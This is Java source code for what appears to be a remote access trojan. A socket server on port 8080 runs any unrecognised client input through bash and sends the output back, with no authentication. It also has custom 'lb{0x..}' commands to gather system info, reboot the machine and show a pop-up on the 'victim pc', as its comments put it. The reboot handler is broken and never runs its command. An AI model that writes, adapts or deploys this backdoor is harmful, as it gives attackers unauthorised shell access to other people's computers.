import java.io.*;
import java.net.*;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import lib.GetInfo;
import lib.Notify;

public class Server {
    public static final int PORT = 8080; /* todo: Get port from config.json */

    public static void main(String[] args) {
        String os = System.getProperty("os.name");

        /* Check if operating system is equal to `Linux` */
        if (!os.equalsIgnoreCase("Linux")) {
            System.err.println("[ERROR] Invalid operating system.");
            System.exit(1);
        }

        try (ServerSocket serverSocket = new ServerSocket()) {
            serverSocket.setReuseAddress(true);
            serverSocket.bind(new InetSocketAddress(PORT));
            System.out.println("Server started on port " + PORT);

            while (true) {
                try {
                    Socket socket = serverSocket.accept();
                    System.out.println("Connection accepted: " + socket);

                    new ClientHandler(socket).start();
                } catch (IOException e) {
                    System.err.println("[ERROR] Error accepting connection: " + e.getMessage());
                }
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error starting server: " + e.getMessage());
        }
    }
}

class ClientHandler extends Thread {
    private final Socket socket;

    private static final String COMMAND_PATTERN = "^lb\\{0x[0-9a-fA-F]+\\}$"; /* lb{0x..hex..} */

    public ClientHandler(Socket socket) {
        this.socket = socket;
    }

    /* This function checks if command.split(" ")[0] matches the regex */
    private static boolean isValidCommand(String command) {
        Pattern pattern = Pattern.compile(COMMAND_PATTERN);
        Matcher matcher = pattern.matcher(command);
        return matcher.matches();
    }

    private String executeCommand(String command) {
        StringBuilder result = new StringBuilder();
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("bash", "-c", command + " 2>&1");

        try {
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }
            while ((line = errorReader.readLine()) != null) {
                result.append(line).append("\n");
            }

            process.waitFor();
        } catch (IOException | InterruptedException e) {
            result.append("Error executing command: ").append(e.getMessage());
        }

        return result.toString();
    }

    @Override
    public void run() {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())),
                        true)) {

            String str;
            while ((str = in.readLine()) != null) {
                boolean isCommand = false; /* Variable to track if input is command */

                System.out.println("Client Input: " + str);

                /*
                 * Check if input is a command
                 * else set isCommand as false
                 */
                if (isValidCommand(str.split(" ")[0]))
                    isCommand = true;
                else
                    isCommand = false;

                /*
                 * Commands Handler
                 */
                if (str.equals("END")) {
                    break;
                }

                if (str.startsWith("lb{0x0001}")) {
                    GetInfo info = new GetInfo();
                    info.run(str, out);
                }

                /*
                 * lb{0x0002} - reboot
                 * Reboot system
                 */
                if (str.startsWith("lb{0x0002}")) {
                    out.println("Rebooting system...");
                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("reboot && sudo reboot");
                }

                /*
                 * lb{0x0004} - Notify
                 * Display notify to victim pc
                 */
                if(str.startsWith("lb{0x0004}")) {
                    @SuppressWarnings("unused")
                    Notify notify = new Notify(out);

                    int index = str.indexOf(" ") + 1;
                    String parsedMessage = str.substring(index);
                    Notify.send("Luther Blissett", parsedMessage);
                }

                /*
                 * ~~ Shell Execution ~~
                 * If the buffer sent by the client is not recognized as a command,
                 * the input is executed in the shell,
                 * and the output is sent back to the client subsequently.
                 */
                if (isCommand == true)
                    continue; /* Check if input isCommand else exec it */

                String result = executeCommand(str);
                out.println(result != null ? result : "No Output provided");
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error handling client: " + e.getMessage());
        } finally {
            try {
                socket.close();
            } catch (IOException e) {
                System.err.println("[ERROR] Error closing socket: " + e.getMessage());
            }
            System.out.println("Connection closed: " + socket);
        }
    }
}
